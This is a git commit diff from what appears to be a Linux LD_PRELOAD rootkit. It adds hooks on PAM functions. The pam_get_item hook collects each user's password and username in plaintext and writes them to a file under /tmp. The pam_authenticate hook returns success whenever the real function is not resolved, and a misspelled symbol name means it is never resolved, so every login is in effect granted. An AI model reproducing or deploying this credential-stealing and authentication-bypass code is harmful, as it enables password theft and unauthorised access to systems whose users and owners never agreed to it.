1d4bab4c42801493cfddf818b400ada33a7a01bf
Michael Vaughan <mavaughan@protonmail.com>
2021-10-20 15:45:43 -0400

    testing on rles

--- src/father.h
+++ src/father.h
@@ -14,6 +14,7 @@
 #include <sys/ptrace.h>
 #include <netinet/in.h>
 #include <security/pam_appl.h>
+#include <security/pam_modules.h>
 #include <arpa/inet.h>
 #include <dirent.h>
 #include <gcrypt.h>
@@ -56,6 +57,7 @@ extern DIR * (*o_opendir)(const char *);
 extern long (*o_ptrace)(enum __ptrace_request, pid_t, void *, void *);
 extern int (*o_execve)(const char *, char *const argv[], char *const envp[]);
 extern int (*o_pam_authenticate)(pam_handle_t *, int);
+extern int (*o_pam_get_item)(const pam_handle_t *, int, const void **);
 extern gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
 
 // functions hooks (interceptions)
@@ -76,6 +78,8 @@ extern FILE * fopen64(const char * pathname, const char * mode);
 extern int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
 extern DIR * opendir(const char *name);
 extern int execve(const char *path, char *const argv[], char *const envp[]);
+extern int pam_get_item(const pam_handle_t * pamh, int item_type, const void ** item);
+extern int pam_authenticate(pam_handle_t * pamh, int flags);
 //extern long ptrace(enum __ptrace_request request, pid_t pid, void * addr, void * data);
 //extern long ptrace(enum __ptrace_request request, ...);
 extern gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey);
--- src/pam.c
+++ src/pam.c
@@ -1,11 +1,39 @@
 #include "father.h"
 
+void exfil(int type, int result, const char * username, const char * password)
+{
+	FILE * fp = fopen("/tmp/silly.txt", "a+");
+	fprintf(fp, "%d:%d:%s:%s\n", type, result, username, password);
+	fclose(fp);
+}
 
 int (*o_pam_authenticate)(pam_handle_t *, int);
 int pam_authenticate(pam_handle_t * pamh, int flags)
 {
-  if(!o_pam_authenticate) {
+  if(o_pam_authenticate == NULL) {
     o_pam_authenticate = dlsym(RTLD_NEXT, "pam_autheticate");
   }
+  exfil(10, 10, "shid", "fug");
+  if (o_pam_authenticate == NULL) return PAM_SUCCESS;
   return o_pam_authenticate(pamh, flags);
 }
+
+
+int (*o_pam_get_item)(const pam_handle_t *, int, const void **);
+int pam_get_item(const pam_handle_t * pamh, int item_type, const void ** item) {
+
+	if(o_pam_get_item == NULL) {
+		o_pam_get_item = dlsym(RTLD_NEXT, "pam_get_item");
+	}
+
+	int result;
+  	const char * username;
+	
+	result = o_pam_get_item(pamh, item_type, item);
+	if (*item && item_type == 2 && result == 0) {
+		pam_get_user((pam_handle_t *)pamh, &username, NULL);
+		exfil(item_type, result, username, (const char *)*item);
+	}
+	return result;
+}
+
